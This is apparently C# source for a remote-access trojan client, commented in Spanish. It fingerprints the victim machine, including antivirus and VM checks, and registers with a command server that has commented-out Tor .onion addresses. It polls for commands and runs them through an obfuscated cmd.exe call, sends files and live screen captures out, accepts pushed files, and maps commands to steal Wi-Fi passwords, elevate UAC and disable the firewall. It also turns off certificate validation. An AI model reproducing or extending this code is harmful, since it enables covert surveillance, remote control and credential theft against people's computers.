using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;
using DotNetTor.SocksPort;

namespace RMT_CLIENT_MVC
{
     public class Program
    {

        //private static string serverURL = "https://192.168.1.113:7277/Clients";
        //private static string serverURL = "http://hhw55u6vurenbwuplnfmee47pxggxpypqersamr3jcryt23ssbkhovqd.onion/Clients";
        private static string serverURL = "https://127.0.0.1:8080/Clients";

        private static HttpClient httpClient;
        private static SystemInformation systemInfo;
        private static bool hasSentInitialScreenshot = false; // Bandera para controlar captura inicial
        private static bool isStreaming = false;
        private static CancellationTokenSource streamingTokenSource;



        static async Task Main(string[] args)
        {
            // 1. Configurar HttpClient con Tor
            //var handler = new SocksPortHandler("127.0.0.1", 9050);
            //httpClient = new HttpClient(handler)
            //{
            //    Timeout = TimeSpan.FromSeconds(30)
            //};

            // Inicializar información del sistema
            systemInfo = new SystemInformation();

            //RemoteMonitor.Initialize("http://hhw55u6vurenbwuplnfmee47pxggxpypqersamr3jcryt23ssbkhovqd.onion");
            RemoteMonitor.Initialize("https://127.0.0.1:8080");


            // Configurar HttpClient para ignorar errores SSL (solo para desarrollo)
            var handler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true
            };

            httpClient = new HttpClient(handler);
            httpClient.Timeout = TimeSpan.FromSeconds(30);



            Console.WriteLine($"Cliente iniciado - {systemInfo.MachineName} ({systemInfo.IPAddress}");
            Console.WriteLine($"{systemInfo.OSVersion}");
            Console.WriteLine($"{systemInfo.UserName}");
            Console.WriteLine($"{systemInfo.OSArchitecture}");
            Console.WriteLine($"{systemInfo.Antivirus}");
            Console.WriteLine($"{systemInfo.IsVirtualMachine}");
            Console.WriteLine($"{systemInfo.Country}");
            Console.WriteLine($"{systemInfo.CPU}");
            Console.WriteLine($"{systemInfo.RAM}");
            Console.WriteLine($"{systemInfo.Drives}");

            while (true)
            {
                try
                {
                    await RegisterWithServer();

                     // Solo enviar captura inicial una vez
                    if (!hasSentInitialScreenshot)
                    {
                        await SendScreenshot();
                        hasSentInitialScreenshot = true;
                    }

                 // await SendScreenshot();
                    await CheckAndExecuteCommands();
                    await CheckAndDownloadFiles();

                    await Task.Delay(5000);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                    await Task.Delay(10000);
                }
            }
        }

        static async Task RegisterWithServer()
        {
            var content = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("machineName", systemInfo.MachineName),
                new KeyValuePair<string, string>("userName", systemInfo.UserName),
                new KeyValuePair<string, string>("ipAddress", systemInfo.IPAddress),
                new KeyValuePair<string, string>("osVersion", systemInfo.OSVersion),
                new KeyValuePair<string, string>("arch", systemInfo.OSArchitecture.ToString()),
                new KeyValuePair<string, string>("av", systemInfo.Antivirus.ToString()),
                new KeyValuePair<string, string>("vm", systemInfo.IsVirtualMachine.ToString()),
                new KeyValuePair<string, string>("pais", systemInfo.Country.ToString()),
                new KeyValuePair<string, string>("cpuCh", systemInfo.CPU.ToString()),
                new KeyValuePair<string, string>("ramCh", systemInfo.RAM.ToString()),
                new KeyValuePair<string, string>("driveL", string.Join("; ", systemInfo.Drives))
            });

            var response = await httpClient.PostAsync($"{serverURL}/Register", content);
            response.EnsureSuccessStatusCode();
            Console.WriteLine("Registro exitoso");
        }

       

        static async Task SendScreenshot()
        {
            try
            {
                byte[] screenshotBytes = CaptureScreen();

                using (var content = new MultipartFormDataContent())
                {
                  
                    content.Add(new StringContent(systemInfo.MachineName), "machineName");
                    content.Add(new StringContent(systemInfo.IPAddress), "ipAddress");

                    var imageContent = new ByteArrayContent(screenshotBytes);
                    imageContent.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse("image/jpeg");
                    content.Add(imageContent, "screenshot", "current_screenshot.jpg");

                    var response = await httpClient.PostAsync($"{serverURL}/UpdateScreenshot", content);
                    response.EnsureSuccessStatusCode();

                    Console.WriteLine("OK");

                  Console.WriteLine("Captura enviada correctamente");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error al enviar captura: " + ex.Message);
            }
        }


        //

        static async Task SendScreenshotSpecific()
        {
            try
            {
                byte[] screenshotBytes = CaptureScreen();

                using (var content = new MultipartFormDataContent())
                {

                    content.Add(new StringContent(systemInfo.MachineName), "machineName");
                    content.Add(new StringContent(systemInfo.IPAddress), "ipAddress");

                    var imageContent = new ByteArrayContent(screenshotBytes);
                    imageContent.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse("image/jpeg");
                    content.Add(imageContent, "screenshot", "current_screenshot.jpg");

                    var response = await httpClient.PostAsync($"{serverURL}/ReceiveClientScreenshot", content);
                    response.EnsureSuccessStatusCode();

                    Console.WriteLine("OK");

                    Console.WriteLine("Captura enviada correctamente");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error al enviar captura: " + ex.Message);
            }
        }
        //

        static byte[] CaptureScreen()
        {
            using (var bitmap = new System.Drawing.Bitmap(
                width: Screen.PrimaryScreen.Bounds.Width,
                height: Screen.PrimaryScreen.Bounds.Height))
            {
                using (var graphics = System.Drawing.Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(
                        sourceX: 0,
                        sourceY: 0,
                        destinationX: 0,
                        destinationY: 0,
                        blockRegionSize: bitmap.Size,
                        copyPixelOperation: System.Drawing.CopyPixelOperation.SourceCopy);
                }

                using (var memoryStream = new MemoryStream())
                {
                    bitmap.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Jpeg);
                    return memoryStream.ToArray();
                }
            }
        }


        /// <summary>
        /// 
        /// </summary>
        /// <returns>
        /// </returns>

        static async Task CheckAndExecuteCommands()
        {
            try
            {
                var content = new FormUrlEncodedContent(new[]
                {
                  
                    new KeyValuePair<string, string>("machineName", systemInfo.MachineName),
                    new KeyValuePair<string, string>("ipAddress", systemInfo.IPAddress)


                });

                var response = await httpClient.PostAsync($"{serverURL}/GetPendingCommands", content);
                var responseString = await response.Content.ReadAsStringAsync();

                dynamic jsonResponse = JsonConvert.DeserializeObject(responseString);
                if (jsonResponse.success == true)
                {
                    foreach (var cmd in jsonResponse.commands)
                    {
                        string commandId = cmd.id;
                        string commandText = cmd.command;

                        Console.WriteLine($"Ejecutando comando: {commandText}");

                        var result = ExecuteCommand(commandText);

                        if (commandText.Equals("VNC-START-SCREEN", StringComparison.OrdinalIgnoreCase))
                        {
                            StartScreenStreaming();
                            result = ("Streaming de pantalla iniciado", false);
                        }
                        else if (commandText.Equals("VNC-STOP-SCREEN", StringComparison.OrdinalIgnoreCase))
                        {
                            StopScreenStreaming();
                            result = ("Streaming de pantalla detenido", false);
                        }
                        else if (commandText.Equals("SCREEN-CAP", StringComparison.OrdinalIgnoreCase))
                        {
                            await SendScreenshotSpecific();
                            result = ("Captura de pantalla tomada y enviada al servidor", false);
                        }

                        //// Comandos para acciones de sistema > cliente 
                        //else if (commandText.Equals("OFF", StringComparison.OrdinalIgnoreCase) ||
                        //      commandText.Equals("CLOSE-SESSION", StringComparison.OrdinalIgnoreCase) ||
                        //      commandText.Equals("RESTART", StringComparison.OrdinalIgnoreCase) ||
                        //      commandText.Equals("KILL-CLIENT", StringComparison.OrdinalIgnoreCase) ||
                        //      commandText.Equals("SLEEP", StringComparison.OrdinalIgnoreCase) ||
                        //      commandText.Equals("LOCK", StringComparison.OrdinalIgnoreCase))
                        //{
                        //    //result = OsCommands.Instance.ExecuteOsCommand(commandText);
                        //    result = await OsCommands.Instance.ExecuteOsCommand(commandText, systemInfo.MachineName, systemInfo.IPAddress);

                        //}

                        //// Comandos para acciones de sistema antivirus y firewall > cliente 
                        //else if (commandText.Equals("", StringComparison.OrdinalIgnoreCase) ||
                        //      commandText.Equals("FIREWALL-ON", StringComparison.OrdinalIgnoreCase) ||
                        //      commandText.Equals("LOCK", StringComparison.OrdinalIgnoreCase))
                        //{
                        //    result = OsAntivirusCommands.Instance.ExecuteOsAntivirusCommand(commandText);
                        //}



                        await SubmitCommandResult(commandId, result.output, result.isError);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al procesar comandos: {ex.Message}");
            }
        }

        //static (string output, bool isError) ExecuteCommand(string command)
        //{
        //    try
        //    {
        //        if (command.StartsWith("LIST_DIR"))
        //        {
        //            var path = command.Substring(9).Trim('"');
        //            if (string.IsNullOrEmpty(path))
        //            {
        //                path = "C:\\";
        //            }
        //            return ListDirectory(path);
        //        }

        //        else if (command.StartsWith("LS_DIR"))
        //        {
        //            var path = command.Substring(7).Trim('"');
        //            if (string.IsNullOrEmpty(path))
        //            {
        //                path = "C:\\";
        //            }
        //            return ListDirectory2(path);
        //        }

        //        else if (command.StartsWith("DOWNLOAD_FILE"))
        //        {
        //            var filePath = command.Substring("DOWNLOAD_FILE".Length).Trim('"');
        //            return DownloadFile(filePath);
        //        }

        //        else if (command.Equals("SCREEN-CAP", StringComparison.OrdinalIgnoreCase))
        //        {
        //            // Ejecutar captura de pantalla y devolver el resultado
        //            try
        //            {
        //                byte[] screenshotBytes = CaptureScreen();
        //                string base64Image = Convert.ToBase64String(screenshotBytes);
        //                return ($"Captura de pantalla tomada y enviada al servidor\n{base64Image}", false);
        //            }
        //            catch (Exception ex)
        //            {
        //                return ($"Error al tomar captura: {ex.Message}", true);
        //            }
        //        }

        //        // Verificar si es un comando de monitoreo
        //        else if (command.StartsWith("MONITOR-"))
        //        {
        //            var monitorCommand = command.Substring(8).ToUpper();
        //            switch (monitorCommand)
        //            {
        //                case "START":
        //                    RemoteMonitor.StartMonitoring();
        //                    return ("Monitoreo iniciado", false);
        //                case "STOP":
        //                    RemoteMonitor.StopMonitoring();
        //                    return ("Monitoreo detenido", false);
        //                case "INTERVAL":
        //                    var interval = int.Parse(command.Split(' ')[1]);
        //                    RemoteMonitor.SetCaptureInterval(interval);
        //                    return ($"Intervalo de captura configurado a {interval}ms", false);
        //                case "QUALITY":
        //                    var quality = int.Parse(command.Split(' ')[1]);
        //                    RemoteMonitor.SetImageQuality(quality);
        //                    return ($"Calidad de imagen configurada a {quality}%", false);
        //                default:
        //                    return ("Comando de monitoreo no reconocido", true);
        //            }
        //        }

        //        // Diccionario de comandos del sistema
        //        var systemCommands = new Dictionary<string, Func<(string output, bool isError)>>(StringComparer.OrdinalIgnoreCase)
        //        {
        //            { "OFF", () => SystemManager.Shutdown() },
        //            { "RESTART", () => SystemManager.Restart() },
        //            { "CLOSE-SESSION", () => SystemManager.CloseSession() },
        //            { "CLOSE", () => SystemManager.CloseApplication() },
        //            { "WIFI-GET-PASSWORD", () => WifiManager.GetStoredNetworks() },
        //            { "SCAN-NETWORK", () => ScanMachineManager.ScanNetwork() },
        //            { "UAC-CHECK", () => UacManager.CheckUacSettings() },
        //            { "UAC-ELEVATE", () => UacElevateManager.ElevateUac() }




        //        };

        //        // Diccionario de comandos del firewall
        //        var firewallCommands = new Dictionary<string, Func<(string output, bool isError)>>(StringComparer.OrdinalIgnoreCase)
        //        {
        //            { "FIREWALL-STATUS", () => FirewallManager.CheckFirewallStatus() },
        //            { "FIREWALL-OFF", () => FirewallManager.DisableFirewall() },
        //            { "FIREWALL-ON", () => FirewallManager.EnableFirewall() }
        //        };

        //        // Verificar si es un comando del sistema
        //        if (systemCommands.TryGetValue(command, out var systemHandler))
        //        {
        //            return systemHandler();
        //        }
        //        // Verificar si es un comando del firewall
        //        else if (firewallCommands.TryGetValue(command, out var firewallHandler))
        //        {
        //            return firewallHandler();
        //        }

        //        string A = "c";
        //        string B = "m";
        //        string C = "d";
        //        string point = ".";
        //        string D = "e";
        //        string E = "x";
        //        string F = "e";
        //        string G = "/";
        //        string H = "c"; 

        //        var processInfo = new ProcessStartInfo($"{A}{B}{C}{point}{D}{E}{F}", $"{G}{H}" + command)
        //        {
        //            CreateNoWindow = true,
        //            UseShellExecute = false,
        //            RedirectStandardError = true,
        //            RedirectStandardOutput = true
        //        };

        //        var process = Process.Start(processInfo);

        //        var outputBuilder = new StringBuilder();
        //        var buffer = new char[4096];
        //        int bytesRead;

        //        while ((bytesRead = process.StandardOutput.Read(buffer, 0, buffer.Length)) > 0)
        //        {
        //            outputBuilder.Append(buffer, 0, bytesRead);
        //        }

        //        string output = outputBuilder.ToString();
        //        outputBuilder.Clear();

        //        while ((bytesRead = process.StandardError.Read(buffer, 0, buffer.Length)) > 0)
        //        {
        //            outputBuilder.Append(buffer, 0, bytesRead);
        //        }

        //        string error = outputBuilder.ToString();
        //        process.WaitForExit();

        //        if (!string.IsNullOrEmpty(error))
        //        {
        //            return ($"Error: {error}\nOutput: {output}", true);
        //        }

        //        return (output, false);
        //    }
        //    catch (Exception ex)
        //    {
        //        return ($"Error al ejecutar comando: {ex.Message}", true);
        //    }

        static (string output, bool isError) ExecuteCommand(string command)
        {
            try
            {
                Func<string, string> trimPath = s => s.Substring(s.IndexOf(' ') + 1).Trim('"');
                Func<string, string, bool> cmdStarts = (c, p) => c.StartsWith(p, StringComparison.OrdinalIgnoreCase);
                Func<string, string> getPath = s => string.IsNullOrEmpty(s) ? "C:\\" : s;

                // Ofuscación de comandos principales
                if (cmdStarts(command, "LIST_DIR"))
                {
                    return ListDirectory(getPath(trimPath(command)));
                }
                else if (cmdStarts(command, "LS_DIR"))
                {
                    return ListDirectory2(getPath(trimPath(command)));
                }
                else if (cmdStarts(command, "DOWNLOAD_FILE"))
                {
                    return DownloadFile(trimPath(command));
                }
                else if (command.Equals("SCREEN-CAP", StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        byte[] screenshotBytes = CaptureScreen();
                        string base64Image = Convert.ToBase64String(screenshotBytes);
                        return ($"SCREENSHOT_SUCCESS\n{base64Image}", false);
                    }
                    catch (Exception ex)
                    {
                        return ($"SCREENSHOT_ERROR:{ex.Message}", true);
                    }
                }

                // Ofuscación de comandos de monitor
                if (cmdStarts(command, "MONITOR-"))
                {
                    string[] parts = command.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    string action = parts[0].Substring(8).ToUpper();
                    int value = parts.Length > 1 ? int.Parse(parts[1]) : 0;

                    switch (action)
                    {
                        case "START": RemoteMonitor.StartMonitoring(); return ("MON_STARTED", false);
                        case "STOP": RemoteMonitor.StopMonitoring(); return ("MON_STOPPED", false);
                        case "INTERVAL": RemoteMonitor.SetCaptureInterval(value); return ($"INTERVAL_SET:{value}", false);
                        case "QUALITY": RemoteMonitor.SetImageQuality(value); return ($"QUALITY_SET:{value}", false);
                        default: return ("UNKNOWN_MON_CMD", true);
                    }
                }

                // Ofuscación de comandos del sistema
                var cmdMap = new Dictionary<string, Func<(string, bool)>>(StringComparer.OrdinalIgnoreCase)
                {
                    ["OFF"] = () => SystemManager.Shutdown(),
                    ["RESTART"] = () => SystemManager.Restart(),
                    ["CLOSE-SESSION"] = () => SystemManager.CloseSession(),
                    ["KILL-CLIENT"] = () => SystemManager.CloseApplication(),
                    ["LOCK"] = () => SystemManager.LockWorkstation(),
                    ["WIFI-GET-PASSWORD"] = () => WifiManager.GetStoredNetworks(),
                    ["SCAN-NETWORK"] = () => ScanMachineManager.ScanNetwork(),
                    ["UAC-CHECK"] = () => UacManager.CheckUacSettings(),
                    ["UAC-ELEVATE"] = () => UacElevateManager.ElevateUac(),
                    ["FIREWALL-STATUS"] = () => FirewallManager.CheckFirewallStatus(),
                    ["FIREWALL-OFF"] = () => FirewallManager.DisableFirewall(),
                    ["FIREWALL-ON"] = () => FirewallManager.EnableFirewall()
                };

                if (cmdMap.TryGetValue(command.Split(' ')[0], out var handler))
                    return handler();

                // Ofuscación avanzada de cmd.exe
                var chars = new Func<string>[]
                {
            () => Encoding.ASCII.GetString(new byte[] { 99 }),  // c
            () => "m",
            () => $"{'d'}",
            () => new string(new[] { '.' }),
            () => Convert.ToChar(101).ToString(),  // e
            () => Math.Sqrt(144) == 12 ? "x" : "",  // x
            () => new StringBuilder().Append('e').ToString(),
            () => "/",
            () => "c"
                };

                var AubreeValantine = string.Concat(chars[0](), chars[1](), chars[2](), chars[3](), chars[4](), chars[5](), chars[6]());
                var XXX = string.Concat(chars[7](), chars[8](), " ", command);

                var psi = new ProcessStartInfo
                {
                    FileName = AubreeValantine,
                    Arguments = XXX,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (var process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    return string.IsNullOrEmpty(error) ? (output, false) : ($"CMD_ERROR:{error}", true);
                }
            }
            catch (Exception ex)
            {
                return ($"GLOBAL_ERROR:{ex.Message}", true);
            }
        }




        static async Task SubmitCommandResult(string commandId, string result, bool isError)
        {
            try
            {
                const int maxChunkSize = 1024 * 1024;
                int offset = 0;
                int chunkNumber = 0;
                bool hasMoreData = true;

                while (hasMoreData)
                {
                    int chunkSize = Math.Min(maxChunkSize, result.Length - offset);
                    string chunk = result.Substring(offset, chunkSize);
                    offset += chunkSize;
                    hasMoreData = offset < result.Length;

                    // Crear el contenido sin codificación URL
                    var formData = new MultipartFormDataContent();
                    formData.Add(new StringContent(systemInfo.MachineName), "machineName");
                    formData.Add(new StringContent(systemInfo.IPAddress), "ipAddress");
                    formData.Add(new StringContent(commandId), "commandId");
                    formData.Add(new StringContent(chunk), "result"); // No usar EscapeDataString aquí
                    formData.Add(new StringContent(isError.ToString()), "isError");
                    formData.Add(new StringContent(chunkNumber.ToString()), "chunkNumber");
                    formData.Add(new StringContent((hasMoreData ? -1 : chunkNumber + 1).ToString()), "totalChunks");
                    formData.Add(new StringContent(hasMoreData.ToString()), "isPartial");

                    var response = await httpClient.PostAsync($"{serverURL}/SubmitCommandResult", formData);
                    response.EnsureSuccessStatusCode();

                    Console.WriteLine($"Fragmento {chunkNumber} enviado. Más fragmentos: {hasMoreData}");
                    chunkNumber++;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al enviar resultado: {ex.Message}");
            }
        }

        static (string output, bool isError) ListDirectory(string path)
        {
            try
            {
                if (!Directory.Exists(path))
                {
                    return ($"El directorio no existe: {path}", true);
                }

                var entries = new List<FileSystemEntry>();

                foreach (var dir in Directory.GetDirectories(path))
                {
                    try
                    {
                        var dirInfo = new DirectoryInfo(dir);
                        entries.Add(new FileSystemEntry
                        {
                            Name = dirInfo.Name,
                            Path = dirInfo.FullName,
                            Type = "directory",
                            Size = 0,
                            LastModified = dirInfo.LastWriteTime
                        });
                    }
                    catch (UnauthorizedAccessException)
                    {
                        entries.Add(new FileSystemEntry
                        {
                            Name = Path.GetFileName(dir) + " (Acceso denegado)",
                            Path = dir,
                            Type = "directory",
                            Size = 0,
                            LastModified = DateTime.MinValue
                        });
                    }
                }

                foreach (var file in Directory.GetFiles(path))
                {
                    try
                    {
                        var fileInfo = new FileInfo(file);
                        entries.Add(new FileSystemEntry
                        {
                            Name = fileInfo.Name,
                            Path = fileInfo.FullName,
                            Type = "file",
                            Size = fileInfo.Length,
                            LastModified = fileInfo.LastWriteTime
                        });
                    }
                    catch (UnauthorizedAccessException)
                    {
                        entries.Add(new FileSystemEntry
                        {
                            Name = Path.GetFileName(file) + " (Acceso denegado)",
                            Path = file,
                            Type = "file",
                            Size = 0,
                            LastModified = DateTime.MinValue
                        });
                    }
                }

                entries.Sort((a, b) => {
                    if (a.Type == b.Type)
                        return string.Compare(a.Name, b.Name, StringComparison.OrdinalIgnoreCase);
                    return a.Type == "directory" ? -1 : 1;
                });

                return (JsonConvert.SerializeObject(entries), false);
            }
            catch (Exception ex)
            {
                return ($"Error al listar directorio: {ex.Message}", true);
            }
        }


        static (string output, bool isError) ListDirectory2(string path)
        {
            try
            {
                if (!Directory.Exists(path))
                {
                    return ($"El directorio no existe: {path}", true);
                }

                var entries = new List<FileSystemEntry>();
                var outputBuilder = new StringBuilder();
                long totalSize = 0;
                int dirCount = 0;
                int fileCount = 0;

                // Encabezado
                outputBuilder.AppendLine($"\n Directorio de {path}\n");

                foreach (var dir in Directory.GetDirectories(path))
                {
                    try
                    {
                        var dirInfo = new DirectoryInfo(dir);
                        entries.Add(new FileSystemEntry
                        {
                            Name = dirInfo.Name,
                            Path = dirInfo.FullName,
                            Type = "directory",
                            Size = 0,
                            LastModified = dirInfo.LastWriteTime
                        });
                        dirCount++;
                    }
                    catch (UnauthorizedAccessException)
                    {
                        entries.Add(new FileSystemEntry
                        {
                            Name = Path.GetFileName(dir) + " (Acceso denegado)",
                            Path = dir,
                            Type = "directory",
                            Size = 0,
                            LastModified = DateTime.MinValue
                        });
                    }
                }

                foreach (var file in Directory.GetFiles(path))
                {
                    try
                    {
                        var fileInfo = new FileInfo(file);
                        entries.Add(new FileSystemEntry
                        {
                            Name = fileInfo.Name,
                            Path = fileInfo.FullName,
                            Type = "file",
                            Size = fileInfo.Length,
                            LastModified = fileInfo.LastWriteTime
                        });
                        totalSize += fileInfo.Length;
                        fileCount++;
                    }
                    catch (UnauthorizedAccessException)
                    {
                        entries.Add(new FileSystemEntry
                        {
                            Name = Path.GetFileName(file) + " (Acceso denegado)",
                            Path = file,
                            Type = "file",
                            Size = 0,
                            LastModified = DateTime.MinValue
                        });
                    }
                }

                entries.Sort((a, b) => {
                    if (a.Type == b.Type)
                        return string.Compare(a.Name, b.Name, StringComparison.OrdinalIgnoreCase);
                    return a.Type == "directory" ? -1 : 1;
                });

                // Agregar entradas al output
                foreach (var entry in entries)
                {
                    string dateStr = entry.LastModified.ToString("dd/MM/yyyy  HH:mm");
                    string sizeStr = entry.Type == "directory" ? "<DIR>" : FormatFileSize(entry.Size);
                    string nameStr = entry.Name;

                    outputBuilder.AppendLine($"{dateStr}    {sizeStr,-10}    {nameStr}");
                }

                // Pie de página
                outputBuilder.AppendLine($"\n    {fileCount} archivo(s)    {FormatFileSize(totalSize)}");
                outputBuilder.AppendLine($"    {dirCount} directorio(s)");

                return (outputBuilder.ToString(), false);
            }
            catch (Exception ex)
            {
                return ($"Error al listar directorio: {ex.Message}", true);
            }
        }

        private static string FormatFileSize(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            int order = 0;
            double len = bytes;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }
            return $"{len:0.##} {sizes[order]}";
        }

        static (string output, bool isError) DownloadFile(string filePath)
        {
            try
            {
                if (!File.Exists(filePath))
                {
                    return ($"El archivo no existe: {filePath}", true);
                }

                byte[] fileBytes = File.ReadAllBytes(filePath);
                string base64File = Convert.ToBase64String(fileBytes);

                return (base64File, false);
            }
            catch (Exception ex)
            {
                return ($"Error al leer el archivo: {ex.Message}", true);
            }
        }

       

        static async Task CheckAndDownloadFiles()
        {
            try
            {
                var content = new FormUrlEncodedContent(new[]
                {

                new KeyValuePair<string, string>("machineName", systemInfo.MachineName),
                new KeyValuePair<string, string>("ipAddress", systemInfo.IPAddress)

                });

                var response = await httpClient.PostAsync($"{serverURL}/GetPendingFileTransfers", content);
                var responseString = await response.Content.ReadAsStringAsync();

                dynamic jsonResponse = JsonConvert.DeserializeObject(responseString);
                if (jsonResponse.success == true)
                {
                    foreach (var transfer in jsonResponse.transfers)
                    {
                        string transferId = transfer.id.ToString();
                        string fileName = transfer.fileName.ToString();
                        string fileData = transfer.fileData.ToString();
                        string destinationPath = transfer.destinationPath.ToString();

                        try
                        {
                            Directory.CreateDirectory(Path.GetDirectoryName(destinationPath));
                            byte[] fileBytes = Convert.FromBase64String(fileData);
                            File.WriteAllBytes(destinationPath, fileBytes);

                            Console.WriteLine($"Archivo guardado: {destinationPath}");
                            await SubmitFileTransferResult(transferId, true);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error al guardar archivo: {ex.Message}");
                            await SubmitFileTransferResult(transferId, false);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al verificar transferencias: {ex.Message}");
            }
        }

        static async Task SubmitFileTransferResult(string transferId, bool success)
        {
            try
            {
                var content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("machineName", systemInfo.MachineName),
                    new KeyValuePair<string, string>("ipAddress", systemInfo.IPAddress),
                    new KeyValuePair<string, string>("transferId", transferId),
                    new KeyValuePair<string, string>("success", success.ToString())
                });

                var response = await httpClient.PostAsync($"{serverURL}/SubmitFileTransferResult", content);
                response.EnsureSuccessStatusCode();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al enviar resultado de transferencia: {ex.Message}");
            }
        }


        private static void StartScreenStreaming()
        {
            if (isStreaming) return;

            isStreaming = true;
            streamingTokenSource = new CancellationTokenSource();

            Task.Run(async () =>
            {
                Console.WriteLine("Iniciando streaming de pantalla...");

                while (!streamingTokenSource.Token.IsCancellationRequested)
                {
                    try
                    {
                        byte[] screenshotBytes = CaptureScreen();
                        Console.WriteLine($"Frame capturado: {screenshotBytes.Length} bytes");
                        await SendScreenFrame(screenshotBytes);
                        await Task.Delay(33); // Aproximadamente 30 FPS
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error en streaming: {ex.Message}");
                        Console.WriteLine($"Stack trace: {ex.StackTrace}");
                        await Task.Delay(1000); // Esperar un segundo antes de reintentar
                    }
                }

                Console.WriteLine("Streaming detenido");
            }, streamingTokenSource.Token);
        }

        private static void StopScreenStreaming()
        {
            if (!isStreaming) return;

            streamingTokenSource?.Cancel();
            isStreaming = false;
        }

        private static async Task SendScreenFrame(byte[] frameData)
        {
            try
            {
                Console.WriteLine($"Enviando frame de {frameData.Length} bytes a {serverURL}/ReceiveScreenFrame...");

                using (var content = new MultipartFormDataContent())
                {
                    content.Add(new StringContent(systemInfo.MachineName), "machineName");
                    content.Add(new StringContent(systemInfo.IPAddress), "ipAddress");

                    var imageContent = new ByteArrayContent(frameData);
                    imageContent.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse("image/jpeg");
                    content.Add(imageContent, "frame", "current_frame.jpg");

                    var response = await httpClient.PostAsync($"{serverURL}/ReceiveScreenFrame", content);
                    var responseContent = await response.Content.ReadAsStringAsync();
                    Console.WriteLine($"Respuesta del servidor: {responseContent}");

                    if (!response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"Error en la respuesta: {response.StatusCode}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al enviar frame: {ex.Message}");
                Console.WriteLine($"Stack trace: {ex.StackTrace}");
            }
        }








    }


    public class FileSystemEntry
    {
        public string Name { get; set; }
        public string Path { get; set; }
        public string Type { get; set; } // "file" or "directory"
        public long Size { get; set; }
        public DateTime LastModified { get; set; }
    }
}
